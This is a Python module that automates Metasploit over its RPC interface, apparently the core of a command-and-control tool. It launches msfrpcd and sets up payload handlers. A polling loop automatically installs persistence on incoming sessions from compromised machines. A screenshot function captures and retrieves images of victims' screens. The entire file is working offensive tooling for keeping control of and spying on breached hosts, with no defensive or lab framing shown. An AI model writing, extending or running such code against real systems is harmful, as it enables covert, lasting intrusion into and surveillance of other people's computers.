import os
import re
import time
from typing import Optional, Union
from pymetasploit3.msfrpc import MsfRpcClient
from base.config import config
from base.custom_hinting import SessionsType
from base.logger import log, log_msf, log_shell
from base.payload import get_payload_by_name, payloads, need_persist_ports
from pprint import pformat, pprint


def do_run_server():
    log("Starting msfrpcd...")
    command = [
        config.bin.msfrpcd,
        "-U",
        config.msf.username,
        "-P",
        config.msf.password,
        "-p",
        str(config.msf.port),
    ] + (["-f" if config.msf.force_ssl else ""])
    log_shell(" ".join(command))
    import subprocess

    subprocess.Popen(
        command,
        shell=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(config.msf.run_server_on_startup_wait_time)


console_output = ""


def read_console():
    r = console.read()
    global console_output
    console_output += r["data"]
    # print(r["data"], end="")
    return r


def sessions() -> SessionsType:
    return client.sessions.list


def do_connect():
    global client, console
    log("Connecting to msfrpcd...")
    client = MsfRpcClient(
        config.msf.password,
        ssl=config.msf.force_ssl,
        username=config.msf.username,
        server=config.msf.host,
        port=config.msf.port,
    )
    log("Connected to msfrpcd.")

    console = client.consoles.console()


def do_command(cmd, wait_idle: bool = True, timeout: float = -1) -> Optional[str]:
    console.write(cmd)
    if wait_idle:
        start_time = time.time()
        ret = ""
        while True:
            if timeout > 0 and time.time() - start_time > timeout:
                return ret
                raise TimeoutError
            r = read_console()
            ret += r["data"]
            if not r["busy"]:
                return r["data"]
            time.sleep(0.1)


def do_init_handlers():
    for payload in payloads:
        for command in payload.handler_commands:
            log_msf(command)
            do_command(command, wait_idle=True, timeout=5)
    log(f"Initailized {len(payloads)} handlers.")


def exit_session(session_id: Union[str, int]):
    log(f"Exiting session {session_id}...")
    do_command(f"sessions -k {session_id}", wait_idle=True, timeout=5)
    log(f"Exited session {session_id}.")


def persist(session_id: Union[str, int]):
    """
    Make a session persistent.
    """
    payload_name = None
    try:
        payload_name = sessions()[str(session_id)]["via_payload"]
        session_payload = get_payload_by_name(payload_name)
    except ValueError:
        log(f"Payload {payload_name} for session {session_id} is not found.")
        return
    log(f"Persisting session {session_id}...")
    session_payload.persist(str(session_id), do_command)
    exit_session(session_id)
    log(f"Persisting session {session_id} success. Old session {session_id} exited.")


def screenshot(session_id: Union[str, int]) -> Optional[tuple[str, bytes]]:
    log(f"Taking screenshot for session {session_id}...")
    ret = do_command(
        f"screenshot -C screenshot -i {session_id}", wait_idle=True, timeout=5
    )
    if not ret:
        log(f"Taking screenshot for session {session_id} failed. No output.")
        return
    regex_pattern = "Screenshot saved to: (.+)"
    full_filename_groups = re.search(regex_pattern, ret)
    if not full_filename_groups:
        log(
            f"Taking screenshot for session {session_id} failed. Retrieve filename failed. Original output: {ret}."
        )
        return
    full_filename = full_filename_groups[0].strip().strip("\"'")
    try:
        file = open(full_filename, "rb")
    except FileNotFoundError:
        log(
            f"Taking screenshot for session {session_id} failed. File '{full_filename}' not found."
        )
        return
    file_content = file.read()
    file.close()
    log(
        f"Taking screenshot for session {session_id} success. File '{full_filename}' saved."
    )
    try:
        os.remove(full_filename)
    except:
        log(f"Failed to remove screenshot file {full_filename}.")
    file_basename = os.path.basename(full_filename)
    log(f"Screenshot for {session_id} successful.")
    return file_basename, file_content


last_current_sessions = {}


def loop_block():
    while True:
        time.sleep(config.app.check_interval)
        global last_current_sessions
        current_sessions = sessions()
        if last_current_sessions != current_sessions:
            log("Current sessions:")
            log(pformat(current_sessions))
            last_current_sessions = current_sessions
        for session_id, session in sessions().items():
            if int(session["tunnel_local"].split(":")[1]) in need_persist_ports:
                persist(session_id)
